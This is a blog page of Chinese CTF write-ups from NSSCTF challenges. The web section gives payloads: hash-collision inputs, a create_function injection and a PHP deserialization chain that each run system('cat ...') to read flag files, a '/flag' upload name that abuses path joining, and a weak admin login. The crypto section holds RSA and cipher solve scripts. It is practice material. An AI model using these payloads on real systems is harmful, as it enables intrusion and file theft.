+<h1 id="LitCTF-2023-1zjs"><a href="#LitCTF-2023-1zjs" class="headerlink" title="[LitCTF 2023]1zjs"></a>[LitCTF 2023]1zjs</h1><p><img src="https://img-blog.csdnimg.cn/bec5ce71df4b4a1a9b80b36d4f29f9ba.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/ac771ae2b40f4bcaab26725baa807ac7.png" alt="在这里插入图片描述"></p>
+<h1 id="NISACTF-2022-level-up"><a href="#NISACTF-2022-level-up" class="headerlink" title="[NISACTF 2022]level-up"></a>[NISACTF 2022]level-up</h1><p>ctrl+u 有disallow 很像robots.txt<br>访问<br><img src="https://img-blog.csdnimg.cn/6615e54046a74e1fbeee522bff31e3c3.png" alt="在这里插入图片描述"></p>
+<pre><code class="bash">array1=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;array2=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
+</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/6e9c1a9821094106a85431b818303631.png" alt="在这里插入图片描述"></p>
+<pre><code class="bash">array1=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1&amp;array2=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1
+</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/ee4ce74fbd05469797364c24826e2afc.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/fff384829bc0447b8eee4b99ad64d9dc.png" alt="在这里插入图片描述"><br>这里可以<br><code>NI+SA+=txw4ever</code><br><code>NI+SA[=txw4ever</code><br>但是<br><code>NI[SA+=txw4ever</code><br>不行 原因是在使用<code>[</code>替换<code>_</code>后,在<code>[</code>后的字符都不会替换<br><img src="https://img-blog.csdnimg.cn/5ae20c88c6a24865be8aea13b9ec7747.png" alt="在这里插入图片描述"><br><code>\create_function&amp;b=&#125;system(&#39;cat /f*&#39;);?&gt;</code></p>
+<h1 id="SWPUCTF-2022-新生赛-ez-ez-php"><a href="#SWPUCTF-2022-新生赛-ez-ez-php" class="headerlink" title="[SWPUCTF 2022 新生赛]ez_ez_php"></a>[SWPUCTF 2022 新生赛]ez_ez_php</h1><p>读flag.php知道flag在flag<br><img src="https://img-blog.csdnimg.cn/e2b173d06add47bfa33dc4d508f2c3db.png" alt="在这里插入图片描述"></p>
+<h1 id="LitCTF-2023-Ping"><a href="#LitCTF-2023-Ping" class="headerlink" title="[LitCTF 2023]Ping"></a>[LitCTF 2023]Ping</h1><p><img src="https://img-blog.csdnimg.cn/f8b8a42d052e4ac1a7863b80d8e9a0c5.png" alt="在这里插入图片描述"></p>
+<h1 id="CISCN-2019华东南-Web11"><a href="#CISCN-2019华东南-Web11" class="headerlink" title="[CISCN 2019华东南]Web11"></a>[CISCN 2019华东南]Web11<img src="https://img-blog.csdnimg.cn/8d86c5a4766b4af69d09257f1775ba07.png" alt="在这里插入图片描述"></h1><p>Smarty ssti<br><img src="https://img-blog.csdnimg.cn/d366ad7be9de4f8a869b17a2d056c683.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/6712280decd54bf39c145ca32bfecd32.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/280f83e9a9814b5e8cf35d906e4b5c90.png" alt="在这里插入图片描述"></p>
+<h1 id="UUCTF-2022-新生赛-websign"><a href="#UUCTF-2022-新生赛-websign" class="headerlink" title="[UUCTF 2022 新生赛]websign"></a>[UUCTF 2022 新生赛]websign</h1><p>view-source:</p>
+<h1 id="NISACTF-2022-babyupload"><a href="#NISACTF-2022-babyupload" class="headerlink" title="[NISACTF 2022]babyupload"></a>[NISACTF 2022]babyupload</h1><p>过滤了<code>.</code>不知道怎么搞了,回去ctrl+u 给了源码<br><img src="https://img-blog.csdnimg.cn/7ef246dc65fc4fb38ee4bd414b8285c0.png" alt="在这里插入图片描述"><br>这里可以直接读flag<br>传的文件名为<code>/flag</code>在os.path.join的时候因为有<code>/</code>所以path变成<code>/flag</code><br><img src="https://img-blog.csdnimg.cn/70de7700e5e34655868171da5eed291c.png" alt="在这里插入图片描述"></p>
+<h1 id="HUBUCTF-2022-新生赛-checkin"><a href="#HUBUCTF-2022-新生赛-checkin" class="headerlink" title="[HUBUCTF 2022 新生赛]checkin"></a>[HUBUCTF 2022 新生赛]checkin</h1><p><img src="https://img-blog.csdnimg.cn/1038b682eebc4868ae871626b683afda.png" alt="在这里插入图片描述"></p>
+<h1 id="LitCTF-2023-Follow-me-and-hack-me"><a href="#LitCTF-2023-Follow-me-and-hack-me" class="headerlink" title="[LitCTF 2023]Follow me and hack me"></a>[LitCTF 2023]Follow me and hack me<img src="https://img-blog.csdnimg.cn/27d2231df68f459ea994e2d30e36066a.png" alt="在这里插入图片描述"></h1><h1 id="GDOUCTF-2023-hate-eat-snake"><a href="#GDOUCTF-2023-hate-eat-snake" class="headerlink" title="[GDOUCTF 2023]hate eat snake"></a>[GDOUCTF 2023]hate eat snake</h1><p>开着f12进<br><img src="https://img-blog.csdnimg.cn/f9380decbc89415583bb8ba100d27a28.png" alt="在这里插入图片描述"><br><code>Snake.prototype.getScore = function () &#123; return 100 &#125;</code><br>我有点不能理解为什么要用原型,没学过js 有空把node学了,应该大同小异<br>当初做的时候是改的判断条件<br><img src="https://img-blog.csdnimg.cn/72fae775327d44839580aa2fb16d3680.png" alt="在这里插入图片描述"><br>node早晚要学,java结束一定学()</p>
+<h1 id="LitCTF-2023-作业管理系统"><a href="#LitCTF-2023-作业管理系统" class="headerlink" title="[LitCTF 2023]作业管理系统"></a>[LitCTF 2023]作业管理系统</h1><p>弱口令 admin admin<br>文件上传无过滤</p>
+<h1 id="NISACTF-2022-babyserialize"><a href="#NISACTF-2022-babyserialize" class="headerlink" title="[NISACTF 2022]babyserialize"></a>[NISACTF 2022]babyserialize</h1><p>hint说flag在根目录下<br>试了一下反引号 system shell_exec file_get_contents $_GET[1]之类的 都给ban了<br>看wp才知道大小写就能绕</p>
+<p><img src="https://img-blog.csdnimg.cn/568bc3c6476649748e41ffcc04761cd7.png" alt="在这里插入图片描述"><br><code>O:4:&quot;NISA&quot;:2:&#123;s:3:&quot;fun&quot;;O:8:&quot;Ilovetxw&quot;:2:&#123;s:5:&quot;huang&quot;;N;s:2:&quot;su&quot;;r:1;&#125;s:8:&quot;txw4ever&quot;;s:27:&quot;SyStem(&#39;cat /fllllllaaag&#39;);&quot;;&#125;</code></p>
+<h1 id="NISACTF-2022-bingdundun"><a href="#NISACTF-2022-bingdundun" class="headerlink" title="[NISACTF 2022]bingdundun~"></a>[NISACTF 2022]bingdundun~</h1>
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #ff7d73">网络安全</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/python/" style="color: #ffa2c4">python</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #00a596">安全</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/%E5%89%8D%E7%AB%AF/" style="color: #03a9f4">前端</a>
+        </span>
+        
+    </div>
+    <a href="/2023/06/19/NSS%E5%88%B7web(1)/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2023/06/10/NSS%E5%91%A8%E5%B8%B8%E5%88%B7%E5%AF%86%E7%A0%81(3)/">
+        <h2 class="post-title">NSS周常刷密码(3)</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2023/6/10
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <h1 id="LitCTF-2023-md5的破解"><a href="#LitCTF-2023-md5的破解" class="headerlink" title="[LitCTF 2023]md5的破解"></a>[LitCTF 2023]md5的破解</h1><pre><code class="python">from hashlib import md5
+from string import ascii_lowercase,digits
+import itertools 
+
+f1 = &#39;LitCTF&#123;md5can3derypt213thoughcrsh&#125;&#39;
+for i in itertools.product(ascii_lowercase+digits, repeat=4):
+    t = &#39;&#39;.join(i)
+    flag = f1[:13] + t[:2] + f1[13:16] + t[2] + f1[16:31] + t[3] + f1[31:]
+    h = md5(flag.encode()).hexdigest()
+    if h == &#39;496603d6953a15846cd7cc476f146771&#39;:
+        print(flag)
+</code></pre>
+<h1 id="NISACTF-2022-funnycaeser"><a href="#NISACTF-2022-funnycaeser" class="headerlink" title="[NISACTF 2022]funnycaeser"></a>[NISACTF 2022]funnycaeser</h1><p>应该是变异凯撒,先试试</p>
+<pre><code class="python">s = [i for i in b&#39;&#39;&#39;NRQ;P&lt;uLliW^(XQ/QT\NDh&#39;&#39;&#39;]
+for i in range(len(s)):
+    print(chr(s[i] + i),end=&#39;&#39;)    
+</code></pre>
+<p>得到 <code>NSS&gt;TA&#123;Strai4e_&gt;aenaX&#125;</code><br>很接近flag的格式,发现非字母对应的地方有点问题,考虑到题目说凯撒5号<br>给非字母位移5<br>于是脚本如下</p>
+<pre><code class="python">s = [i+5 if not chr(i).isalpha() else i for i in b&#39;&#39;&#39;NRQ;P&lt;uLliW^(XQ/QT\NDh&#39;&#39;&#39;]
+for i in range(len(s)):
+    print(chr(s[i] + i),end=&#39;&#39;)    
+</code></pre>
+<p>NSSCTF{Stran9e_CaesaX}<br>发现还是有点问题,根据题意<br>手动改最后一位为r</p>
+<h1 id="第五空间-2021-signin"><a href="#第五空间-2021-signin" class="headerlink" title="[第五空间 2021]signin"></a>[第五空间 2021]signin</h1><pre><code class="python">from Crypto.Util.number import *
+from tqdm import trange
+import gmpy2
+
+c = 86415476382906786465939442398992406348852252355326334785583474583480585659663836032856765037225261433532613020730103955916772373674295180495452293421279237222544308971840820110279355118064931506637793547489441433938707518241461449059717326341918746156620038847745542794560335988858156929013492541794032580255
+e = 65537
+n = 166337085427556441543394334802135957169988266794453522153008810336368247289697353242192853337017363111987395194428553050681210209730724596529629525357502302165396675392000087988956194589350195512264427901330860811469484473725396354231555692283910488095918243519370430703255279433498479943391876108577325840381
+x = 2509898544460604898497702985357222191225421344430742181152035006910161802193623236888758239071502008180363546424715261788
+
+
+def findp(p,plist):
+    l=len(p)
+    if l==400:
+        plist.append(int(p,2))
+    else:
+        pp=int(p,2)
+        qq=(x^^pp)%2**l
+        if pp*qq%2**l==n%2**l:
+            findp(&#39;1&#39;+p,plist)
+            findp(&#39;0&#39;+p,plist)
+
+plist=[]
+findp(&#39;1&#39;,plist)
+
+for i in trange(len(plist)):
+    PR.&lt;x&gt; = PolynomialRing(Zmod(n))
+    f = x*2^400 + plist[i]
+    f = f.monic()
+    r = f.small_roots(X=2^112, beta=0.4)
+    if r:
+        p = int(plist[i]+r[0]* 2^400)
+        if n%p == 0:
+            break
+
+q = n // p
+d = gmpy2.invert(e, (p-1)*(q-1))
+print(long_to_bytes(power_mod(c, d, n)))
+</code></pre>
+<h1 id="NSSCTF-2022-Spring-Recruit-rrrsssaaa"><a href="#NSSCTF-2022-Spring-Recruit-rrrsssaaa" class="headerlink" title="[NSSCTF 2022 Spring Recruit]rrrsssaaa"></a>[NSSCTF 2022 Spring Recruit]rrrsssaaa</h1><p>n最少有3077位<br>大于p^3^ 3072位<br>于是p3开三次得到p就行了</p>
+<pre><code class="python">from  Crypto.Util.number import *
+import gmpy2
+
+e = 65537
+n = 44571911854174527304485400947383944661319242813524818888269963870884859557542264803774212076803157466539443358890313286282067621989609252352994203884813364011659788234277369629312571477760818634118449563652776213438461157699447304292906151410018017960605868035069246651843561595572415595568705784173761441087845248621463389786351743200696279604003824362262237505386409700329605140703782099240992158439201646344692107831931849079888757310523663310273856448713786678014221779214444879454790399990056124051739535141631564534546955444505648933134838799753362350266884682987713823886338789502396879543498267617432600351655901149380496067582237899323865338094444822339890783781705936546257971766978222763417870606459677496796373799679580683317833001077683871698246143179166277232084089913202832193540581401453311842960318036078745448783370048914350299341586452159634173821890439194014264891549345881324015485910286021846721593668473
+c = 11212699652154912414419576042130573737460880175860430868241856564678915039929479534373946033032215673944727767507831028500814261134142245577246925294110977629353584372842303558820509861245550773062016272543030477733653059813274587939179134498599049035104941393508776333632172797303569396612594631646093552388772109708942113683783815011735472088985078464550997064595366458370527490791625688389950370254858619018250060982532954113416688720602160768503752410505420577683484807166966007396618297253478916176712265476128018816694458551219452105277131141962052020824990732525958682439071443399050470856132519918853636638476540689226313542250551212688215822543717035669764276377536087788514506366740244284790716170847347643593400673746020474777085815046098314460862593936684624708574116108322520985637474375038848494466480630236867228454838428542365166285156741433845949358227546683144341695680712263215773807461091898003011630162481
+p3 = 891438237083490546089708018947678893226384856270496377765399277417697191150845296075484241536063149330788867177806265725641352439792185047059884077696267280233195764685547392586251429555216372682368991273055524268769223153988946085858123028200360359212117360701384933036871231911448311911374115683475228820531478240539549424647154342506853356292956506486091063660095505979187297020928573605860329881982122478494944846700224611808246427660214535971723459345029873385956677292979041143593821672034573140001092625650099257402018634684516092489263998517027205660003413512870074652126328536906790020794659204007921147300771594986038917179253827432120018857213350120695302091483756021206199805521083496979628811676116525321724267588515105188480380865374667274442027086789352802613365511142499668793725505110436809024171752137883546327359935102833441492430652019931999144063825010678766130335038975376834579129516127516820037383067
+q3 = 44571911854174527304485400947383944661319242813524818888269963870884859557542264803774212076803157466539443358890313286282067621989609252352994203884813364011659788234277369629312571477760818634118449563652776213438461157699447304292906151410018017960605868035069246651843561595572415595568705784173761440671033435053531971051698504592848580356684103015611323747688216493729331061402058160819388999663041629882482138465124920580049057123360829897432472221079140360215664537272316836767039948368780837985855835419681893347839311156887660438769948501100287062738217966360434291369179859862550767272985972263442512061098317471708987686120577904202391381040801620069987103931326500146536990700234262413595295698193570184681785854277656410199477649697026112650581343325348837547631237627207304757407395388155701341044939408589591213693329516396531103489233367665983149963665364824119870832353269655933102900004362236232825539480774
+r3 = 22285955927087263652242700473691972330659621406762409444134981935442429778771132401887106038401578733269721679445156643141033810994804626176497101942406682005829894117138684814656285738880409317059224781826388106719230578849723652146453075705009008980302934017534623325921780797786207797784352892086880720749202442492937918619992591614713131681306874944356693778359565004415437554407990089293135634916859631279984463829118336826115430997439527110961309956466956650522900331263720500751112297418506140413317489683875995326726992533904683800042127871963320754241310699432792081707870167598822650064976439270556418985242630368723264289700246406905189810458354474959276748887369363592834205660349184660073395182450526542246354364903399132116153732074081050985584216815493617906868615192465631416955706457835185743023758573279838341229835613609332206338401219168119635681832981552328638132500079074010106995297184587143613134093145
+p = gmpy2.iroot(p3,3)[0]
+
+i = 0
+while True:
+    r = p * 5 + i
+    if isPrime(r):
+        i = 0
+        break
+    else:
+        i += 1
+while True:
+    q = p * 10 + i
+    if isPrime(q):
+        break
+    else:
+        i += 1
+d = gmpy2.invert(e,(p-1)*(q-1)*(r-1))
+print(long_to_bytes(pow(c,d,n)))
+</code></pre>
+<h1 id="长安杯-2021-checkin"><a href="#长安杯-2021-checkin" class="headerlink" title="[长安杯 2021]checkin"></a>[长安杯 2021]checkin</h1><pre><code class="python">from  Crypto.Util.number import *
+import gmpy2
+
+
+e = 1049
+c1 = 4513855932190587780512692251070948513905472536079140708186519998265613363916408288602023081671609336332823271976169443708346965729874135535872958782973382975364993581165018591335971709648749814573285241290480406050308656233944927823668976933579733318618949138978777831374262042028072274386196484449175052332019377
+c2 = 3303523331971096467930886326777599963627226774247658707743111351666869650815726173155008595010291772118253071226982001526457616278548388482820628617705073304972902604395335278436888382882457685710065067829657299760804647364231959804889954665450340608878490911738748836150745677968305248021749608323124958372559270
+kn = 2**e - c1
+for q in range(2**15,2**16):
+    if isPrime(q) and gmpy2.gcd(kn,q) != 1:
+        if(kn % q == 0):
+            kp = kn // q
+            print (q, kp)
+            break
+
+q = 34211
+# kp拿去分解
+p = 170229264879724117919007372149468684565431232721075153274808454126426741324966131188484635914814926870341378228417496808202497615585946352638507704855332363766887139815236730403246238633855524068161116748612090155595549964229654262432946553891601975628848891407847198187453488358420350203927771308228162321231
+n = p*q
+d = gmpy2.invert(e,(p-1)*(q-1))
+M = pow(c2,d,n)
+
+tem = 1
+for i in range(p - q , p):
+    tem = tem*i%p
+m = (-M*tem)%p
+
+print(long_to_bytes(m))
+</code></pre>
+<h1 id="LitCTF-2023-factordb-中级"><a href="#LitCTF-2023-factordb-中级" class="headerlink" title="[LitCTF 2023]factordb (中级)"></a>[LitCTF 2023]factordb (中级)</h1><p><img src="https://img-blog.csdnimg.cn/5edabf6135ce47c3b4665c0ddb6fc381.png" alt="在这里插入图片描述"></p>
+<h1 id="zer0pts-2020-ROR"><a href="#zer0pts-2020-ROR" class="headerlink" title="[zer0pts 2020]ROR"></a>[zer0pts 2020]ROR</h1><pre><code class="python">from Crypto.Util.number import *
+
+lines = open(&quot;chall.txt&quot;,&quot;rb&quot;).readlines()
+s = &#39;&#39;
+for line in lines:
+    s += bin(int(line.strip()))[-1]
+    
+print(long_to_bytes(int(s[::-1], 2)))
+</code></pre>
+<h1 id="LitCTF-2023-Virginia"><a href="#LitCTF-2023-Virginia" class="headerlink" title="[LitCTF 2023]Virginia"></a>[LitCTF 2023]Virginia</h1><pre><code class="python">from  Crypto.Util.number import *
+import gmpy2
+
+flag = &#39;&#39;
+c = [86, 116, 128, 80, 98, 85, 139, 122, 134, 114, 125, 136, 117, 123, 129, 127, 128, 128, 142, 130, 140, 147, 127, 132, 131, 136, 151, 134, 152, 164]
+for i in range(len(c)):
+    c[i] = c[i] - i+ (ord(&quot;L&quot;) - 86)
+    flag += chr(c[i])
+
+print(flag)
+</code></pre>
+<h1 id="HNCTF-2022-Week1-baBAbaseSEse"><a href="#HNCTF-2022-Week1-baBAbaseSEse" class="headerlink" title="[HNCTF 2022 Week1]baBAbaseSEse"></a>[HNCTF 2022 Week1]baBAbaseSEse</h1><p><img src="https://img-blog.csdnimg.cn/c334d7fd3c224d4091a8983602b52fb9.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/6e5929125fbb49b8816f70d01b4c0ab3.png" alt="在这里插入图片描述"></p>
+<h1 id="LitCTF-2023-P-Leak"><a href="#LitCTF-2023-P-Leak" class="headerlink" title="[LitCTF 2023]P_Leak"></a>[LitCTF 2023]P_Leak</h1><p>dp泄露<br><img src="https://img-blog.csdnimg.cn/2bbee671a12d42e8abfacb57eb60bb09.png" alt="在这里插入图片描述"></p>
+<h1 id="HGAME-2022-week1-Matryoshka"><a href="#HGAME-2022-week1-Matryoshka" class="headerlink" title="[HGAME 2022 week1]Matryoshka"></a>[HGAME 2022 week1]Matryoshka</h1><p>套成这样我包做不出来的<br><code>https://www.nssctf.cn/note/set/190</code><br>发现像盲文的东西只有三个字符来回出现<br>于是考虑到摩斯<br><code>摩斯-&gt;反转摩斯-&gt;hex-&gt;Vigenere(hgame)-&gt;base64-&gt;rail_fence(22)-&gt;ceasar(21)</code></p>
+<h1 id="HDCTF-2023-Normal-Rsa-revenge"><a href="#HDCTF-2023-Normal-Rsa-revenge" class="headerlink" title="[HDCTF 2023]Normal_Rsa(revenge)"></a>[HDCTF 2023]Normal_Rsa(revenge)</h1><p>n 1280位<br>p 256位 p^2^ &lt; n 直接开根<br>q^2^ &lt;n直接开根</p>
+<pre><code class="python">from  Crypto.Util.number import *
+import gmpy2
+
+e=65537
+
+P = 8760210374362848654680470219309962250697808334943036049450523139299289451311563307524647192830909610600414977679146980314602124963105772780782771611415961
+Q = 112922164039059900199889201785103245191294292153751065719557417134111270255457254419542226991791126571932603494783040069250074265447784962930254787907978286600866688977261723388531394128477338117384319760669476853506179783674957791710109694089037373611516089267817074863685247440204926676748540110584172821401
+n = 12260605124589736699896772236316146708681543140877060257859757789407603137409427771651536724218984023652680193208019939451539427781667333168267801603484921516526297136507792965087544395912271944257535087877112172195116066600141520444466165090654943192437314974202605817650874838887065260835145310202223862370942385079960284761150198033810408432423049423155161537072427702512211122538749
+c = 7072137651389218220368861685871400051412849006784353415843217734634414633151439071501997728907026771187082554241548140511778339825678295970901188560688120351732774013575439738988314665372544333857252548895896968938603508567509519521067106462947341820462381584577074292318137318996958312889307024181925808817792124688476198837079551204388055776209441429996815747449815546163371300963785
+
+p = gmpy2.iroot(P,2)[0]
+q = gmpy2.iroot(Q,2)[0]
+r = n // p // q
+
+d = gmpy2.invert(e,(p-1)*(q-1)*(r-1))
+print(long_to_bytes(pow(c,d,n)))
+</code></pre>
+<h1 id="AFCTF-2018-One-Secret-Two-encryption"><a href="#AFCTF-2018-One-Secret-Two-encryption" class="headerlink" title="[AFCTF 2018]One Secret, Two encryption"></a>[AFCTF 2018]One Secret, Two encryption</h1><p>共享素数</p>
+<h1 id="SWPUCTF-2022-新生赛-善哉善哉"><a href="#SWPUCTF-2022-新生赛-善哉善哉" class="headerlink" title="[SWPUCTF 2022 新生赛]善哉善哉"></a>[SWPUCTF 2022 新生赛]善哉善哉</h1><p>文件尾处有摩斯<br>解得新佛曰<br>解得一串字符串<br>查wp得知要过md5,这个当时的题应该有说的(然而也未必) 复现没这句话</p>
+<h1 id="黑盾杯-2020-Round"><a href="#黑盾杯-2020-Round" class="headerlink" title="[黑盾杯 2020]Round"></a>[黑盾杯 2020]Round</h1><p>一开始以为是base92 base85之类的,这种题要知道flag的格式就比较好做,可以直接找找规律</p>
+<pre><code class="python">s = &#39;:D@J::K=r&lt;ecXi^\[V:X\jXit&#39;
+for i in range(1,26):
+    flag = &#39;&#39;
+    for j in range(len(s)):
+        flag += chr(ord(s[j]) + i)
+    
+    if &#39;CTF&#39; in flag or &#39;ctf&#39; in flag or &#39;flag&#39; in flag:
+        print(flag)  
+</code></pre>
+<h1 id="湖湘杯-2021-signin"><a href="#湖湘杯-2021-signin" class="headerlink" title="[湖湘杯 2021]signin"></a>[湖湘杯 2021]signin</h1><p>已知 n1&#x2F;n2 &#x3D; p1<strong>4*q1&#x2F;p2</strong>4*q2<br>p1和p2接近<br>于是有<br>n1&#x2F;n2 约等于 q1&#x2F;q2<br>连分数逼近<br>逼近的脚本来自la佬<code>https://lazzzaro.github.io/2020/05/06/crypto-RSA/</code></p>
+<pre><code class="python">from Crypto.Util.number import *
+import gmpy2
+
+
+pk = (1150398070565459492080597718626032792435556703413923483458704675295997646493249759818468321328556510074044954676615760446708253531839417036997811506222349194302791943489195718713797322878586379546657275419261647635859989280700191441312691274285176619391539387875252135478424580680264554294179123254566796890998243909286508189826458854346825493157697201495100628216832191035903848391447704849808577310612723700318670466035077202673373956324725108350230357879374234418393233, 1242678737076048096780023147702514112272319497423818488193557934695583793070332178723043194823444815153743889740338870676093799728875725651036060313223096288606947708155579060628807516053981975820338028456770109640111153719903207363617099371353910243497871090334898522942934052035102902892149792570965804205461900841595290667647854346905445201396273291648968142608158533514391348407631818144116768794595226974831093526512117505486679153727123796834305088741279455621586989)
+c1, c2 = (361624030197288323178211941746074961985876772079713896964822566468795093475887773853629454653096485450671233584616088768705417987527877166166213574572987732852155320225332020636386698169212072312758052524652761304795529199864805108000796457423822443871436659548626629448170698048984709740274043050729249408577243328282313593461300703078854044587993248807613713896590402657788194264718603549894361488507629356532718775278399264279359256975688280723740017979438505001819438, 33322989148902718763644384246610630825314206644879155585369541624158380990667828419255828083639294898100922608833810585530801931417726134558845725168047585271855248605561256531342703212030641555260907310067120102069499927711242804407691706542428236208695153618955781372741765233319988193384708525251620506966304554054884590718068210659709406626033891748214407992041364462525367373648910810036622684929049996166651416565651803952838857960054689875755131784246099270581394)
+e = 0x10001
+
+
+
+
+
+def transform(x,y):	   #使用辗转相除将分数x/y转为连分数的形式
+    res=[]
+    while y:
+        res.append(x//y)
+        x,y=y,x%y
+    return res
+ 
+def continued_fraction(sub_res):
+    numerator,denominator=1,0
+    for i in sub_res[::-1]:	  #从sublist的后面往前循环
+        denominator,numerator=numerator,i*numerator+denominator
+    return denominator,numerator   #得到渐进分数的分母和分子，并返回
+ 
+#求解每个渐进分数
+def sub_fraction(x,y):
+    res=transform(x,y)
+    res=list(map(continued_fraction,(res[0:i] for i in range(1,len(res)))))  #将连分数的结果逐一截取以求渐进分数
+    return res
+ 
+def wienerAttack(n1,n2):
+    for (q2,q1) in sub_fraction(n1,n2):  #用一个for循环来注意试探n1/n2的连续函数的渐进分数，直到找到一个满足条件的渐进分数
+        if q1==0:					 #可能会出现连分数的第一个为0的情况，排除
+            continue
+        if n1%q1==0 and q1!=1:			 #成立条件
+            return (q1,q2)
+    print(&quot;该方法不适用&quot;)
+q1,q2 = (wienerAttack(pk[0],pk[1]))
+p1 = gmpy2.iroot((pk[0] // q1),4)[0]
+p2 = gmpy2.iroot((pk[1] // q2),4)[0]
+d1 = gmpy2.invert(e,p1**3*(p1-1)*(q1-1))
+d2 = gmpy2.invert(e,p2**3*(p2-1)*(q2-1))
+print(long_to_bytes(pow(c1,d1,pk[0]))+long_to_bytes(pow(c2,d2,pk[1])))
+</code></pre>
+<h1 id="NCTF-2019-Sore"><a href="#NCTF-2019-Sore" class="headerlink" title="[NCTF 2019]Sore"></a>[NCTF 2019]Sore</h1><p><code>https://www.guballa.de/vigenere-solver</code><br>梭出来的大小写有点问题<br>这题应该也是当时给了第一句话让我们倒推key<br><code>vlbeunuozbpycklsjXlfpaq</code></p>
+<h1 id="LitCTF-2023-e的学问"><a href="#LitCTF-2023-e的学问" class="headerlink" title="[LitCTF 2023]e的学问"></a>[LitCTF 2023]e的学问</h1><p>e φ不互素<img src="https://img-blog.csdnimg.cn/5694aa1617bd4883ae81be72f3481b34.png" alt="在这里插入图片描述"></p>
+<h1 id="安徽省赛-2021-别忘了往下看"><a href="#安徽省赛-2021-别忘了往下看" class="headerlink" title="[安徽省赛 2021]别忘了往下看"></a>[安徽省赛 2021]别忘了往下看</h1><p>base64-&gt;键盘</p>
+<h1 id="红明谷CTF-2022-easy-ya"><a href="#红明谷CTF-2022-easy-ya" class="headerlink" title="[红明谷CTF 2022]easy_ya"></a>[红明谷CTF 2022]easy_ya</h1><p>m &#x3D; M+kr<br>(M+kr)**e 同余 c mod n</p>
+<pre><code class="python">rom Crypto.Util.number import *
+
+
+r = 7996728164495259362822258548434922741290100998149465194487628664864256950051236186227986990712837371289585870678059397413537714250530572338774305952904473
+M = 4159518144549137412048572485195536187606187833861349516326031843059872501654790226936115271091120509781872925030241137272462161485445491493686121954785558
+n = 131552964273731742744001439326470035414270864348139594004117959631286500198956302913377947920677525319260242121507196043323292374736595943942956194902814842206268870941485429339132421676367167621812260482624743821671183297023718573293452354284932348802548838847981916748951828826237112194142035380559020560287
+e = 3
+c = 46794664006708417132147941918719938365671485176293172014575392203162005813544444720181151046818648417346292288656741056411780813044749520725718927535262618317679844671500204720286218754536643881483749892207516758305694529993542296670281548111692443639662220578293714396224325591697834572209746048616144307282
+
+PR.&lt;x&gt; = PolynomialRing(Zmod(n))
+f = (M + x*r)^e - c
+f = f.monic()
+roots = f.small_roots()
+k = int(roots[0])
+m = (M + k*r) 
+print(long_to_bytes(m))
+</code></pre>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
